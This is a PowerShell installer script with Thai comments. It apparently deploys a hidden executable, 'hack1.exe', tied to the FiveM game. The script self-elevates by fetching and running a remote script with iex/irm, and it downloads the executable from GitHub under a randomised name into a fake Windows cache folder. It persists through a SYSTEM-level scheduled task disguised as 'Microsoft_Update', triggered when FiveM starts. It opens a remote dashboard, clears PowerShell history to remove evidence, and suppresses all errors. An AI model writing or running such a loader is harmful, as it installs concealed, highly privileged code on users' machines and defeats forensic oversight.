# 1. [Self-Elevation] ตรวจสอบและขอสิทธิ์ Administrator
$scriptUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/install.ps1"

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm '$scriptUrl')`"" -Verb RunAs
    exit
}

# 2. [Configuration] ตั้งค่าตัวแปรและสุ่มชื่อไฟล์เพื่อความเนียน
$p_rand = @("font","drv","host","win","svc") | Get-Random
$m_rand = @("vcp","mgr","svc","hosts","core") | Get-Random
$r_rand = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})

$fileName = "$p_rand$m_rand`_$r_rand.exe"
$taskName = "Microsoft_Update_$r_rand"
$dashboardUrl = "https://creative-bombolone-1e0912.netlify.app/"
$exeUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/hack1.exe"

# ที่อยู่ไฟล์ (ซ่อนใน LocalAppData เพื่อเลียนแบบไฟล์ Cache ระบบ)
$destFolder = "$env:LOCALAPPDATA\Microsoft\Windows\Caches"
if (!(Test-Path $destFolder)) { New-Item -Path $destFolder -ItemType Directory -Force | Out-Null }
$destPath = "$destFolder\$fileName"

# 3. [Installation] เริ่มการติดตั้ง
try {
    Write-Host "[*] System Initializing..." -ForegroundColor Cyan
    
    # ดาวน์โหลด Engine (hack1.exe)
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $exeUrl -OutFile $destPath -UseBasicParsing
    Unblock-File -Path $destPath

    # 4. [Persistence] ตั้งค่าให้รันอัตโนมัติเมื่อเปิด FiveM (ใช้ Event ID 4688)
    auditpol /set /subcategory:"Process Creation" /success:enable | Out-Null
    
    # Filter ตรวจจับการเปิด FiveM หรือ GTAProcess
    $filter = "*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName'] and (contains(.,'FiveM.exe') or contains(.,'FiveM_GTAProcess.exe'))]]"
    
    # สร้าง Task Scheduler รันด้วยสิทธิ์ SYSTEM (สูงสุด)
    schtasks /create /tn "$taskName" /tr "'$destPath'" /sc ONEVENT /ec Security /mo "$filter" /ru SYSTEM /f | Out-Null

    Write-Host "[+] Installation Complete." -ForegroundColor Green

    # 5. [Web Control] เปิดหน้า Dashboard สำหรับควบคุมทันที
    Start-Process $dashboardUrl

    # 6. [Anti-Forensics] ล้างประวัติการพิมพ์คำสั่งเพื่อลบหลักฐาน
    $historyPath = (Get-PSReadlineOption).HistorySavePath
    if (Test-Path $historyPath) { Clear-Content $historyPath -Force }
    Clear-History
}
catch {
    # ปิดเงียบหากเกิดข้อผิดพลาด
}
